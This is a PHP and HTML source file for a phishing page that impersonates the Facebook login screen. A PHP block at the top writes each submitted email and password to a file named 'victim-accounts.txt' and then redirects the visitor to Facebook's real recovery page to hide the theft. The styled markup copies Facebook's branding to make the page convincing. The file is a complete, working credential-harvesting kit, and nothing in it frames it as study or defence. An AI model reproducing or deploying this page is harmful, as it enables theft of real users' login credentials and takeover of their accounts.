<?php

if(isset($_POST['Login'])) {
    $account = $_POST['account'];
    $password = $_POST['password'];
file_put_contents("victim-accounts.txt", "Email: " . $_POST['account'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
}

?>



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        }
        
        .container {
            width: 80%;
            max-width: 1000px;
            margin: auto;
            display: flex;
            flex-wrap: wrap;
            height: 100vh;
        }
        
        .left {
            width: 55%;
            display: flex;
            justify-content: center;
            flex-flow: column;
            padding-right: 2em;
            box-sizing: border-box;
        }
        
        .right {
            width: 45%;
            display: flex;
            justify-content: center;
            flex-flow: column;
        }
        
        .logo {
            font-weight: 900;
            color: #007bff;
            font-size: 5em;
            margin: 0;
        }
        
        .tagline {
            font-weight: 400;
            color: #212529;
            font-size: 2em;
            margin: 0;
        }
        
        .login-box {
            box-sizing: border-box;
            width: 100%;
            padding: 20px;
            box-shadow: 0 0 9px #c0bcbc87;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            flex-flow: column;
            background-color: white;
        }
        
        input {
            padding: 15px 10px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 1.1em;
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
        }
        
        .button {
            background-color: #007bff;
            color: white;
            font-size: 1.3em;
            text-align: center;
        }
        
        .button:hover {
            background-color: #0069da;
            cursor: pointer;
        }
        
        .forget {
            font-size: 0.8em;
            color: #007bff;
            text-align: center;
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
        }
        
        hr {
            width: 80%;
            clear: both;
            display: block;
            border: none;
            background-color: #e6e6e6;
            height: 1px;
        }
        
        #create {
            background-color: #18a82b;
            margin: 0 auto;
        }
        
        .small {
            text-align: center;
            font-family: inherit;
            font-size: inherit;
            line-height: inherit;
            width: 100%;
        }
        
        form {
            width: 100%;
        }
        
        .footer {
            display: none;
        }
        
        @media screen and (max-width:768px) {
            .left,
            .right {
                width: 100%;
            }
            .tagline {
                display: none;
            }
            .container {
                align-content: center;
                width: 95%;
                height: auto;
            }
            .logo {
                margin-bottom: 0.2em;
                font-size: 3em;
                text-align: center;
            }
            .left {
                padding: 0;
            }
            .login-box {
                box-shadow: none;
            }
            .footer {
                margin-top: 1em;
                display: flex;
                width: 100%;
                align-items: center;
                flex-flow: column;
            }
            .menu {
                display: flex;
                width: 95%;
                justify-content: center;
                flex-flow: row;
            }
            .menu-col {
                display: flex;
                width: 50%;
                justify-content: center;
                flex-flow: column;
            }
            .menu-col p {
                text-align: center;
                font-family: inherit;
                color: #007bff;
                line-height: 30%;
            }
            .small {
                display: none;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="left">
            <h1 class="logo">facebook</h1>
            <h1 class="tagline">Connect with friends and the world around you on Facebook.</h1>
        </div>
        <div class="right">
            <form action='index.php' method='post'>
            <div class="login-box">

                <input id="email" type="text" placeholder="Email or Phone Number" name="account">
                <input id="pass" type="password" placeholder="Password" name="password">
                <input class="button" type='submit' name="Login" value="Log In" />
                <p class="forget">Forgot your password?</p>
                <hr>

                <input class="button" value="Create an account" id="create" />
            </div>
            </form>
            <p class="small"><b>Create a Page</b> for a celebrity, brand or buisness.</p>
        </div>
    </div>
    <div class="footer">
        <div class="menu">
            <div class="menu-col">
                <p>English (US)</p>
                <p>हिन्दी</p>
                <p>Portugues (Brasil)</p>
                <p>Deutsch</p>
            </div>
            <div class="menu-col">
                <p>नेपाली</p>
                <p>Espanol</p>
                <p>Francais (France)</p>
            </div>
        </div>
    </div>

</body>

</html>



